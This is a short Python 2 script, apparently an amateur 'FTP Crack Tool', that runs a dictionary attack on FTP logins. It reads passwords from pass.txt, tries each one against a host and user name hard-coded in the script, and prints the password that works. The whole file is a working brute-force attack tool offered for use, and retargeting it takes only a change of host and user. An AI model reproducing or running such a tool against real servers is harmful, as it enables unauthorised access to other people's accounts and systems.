#!/usr/bin/env python

import sys, os
import ftplib
from termcolor import colored
from colorama import Fore, Back, Style

tool = """
||=====	FTP Crack Tool v0.1
||   	site: besimaltinok.com
||===	mail: besimaltnok[at]gmail.com
||      git : besimaltnok
||
"""
def ftp_brute(p):
	try:
		print "[*] User : securityci ", " [*] Password : ", p
		host = 'localhost'
		user = "besim"
		ftp = ftplib.FTP(host, timeout=0.08)
		ftp.login(user, p)
		print colored("[*] Password Found ! :) = > " + str(p), 'green')
		ftp.quit()
		sys.exit(0)
		
	except Exception, e:
		sys.stdout.flush()

if __name__ == "__main__":
	os.system('reset')
	print(Fore.GREEN + tool)
	print(Style.RESET_ALL)
	passfile = open("pass.txt", "r").readlines()
	map(ftp_brute, passfile)
	print Back.WHITE + Fore.RED + "I can't found password for you :/ I m sorry :-("
	print Back.WHITE + Fore.RED + "Try ", len(passfile), " password for cracking :/"
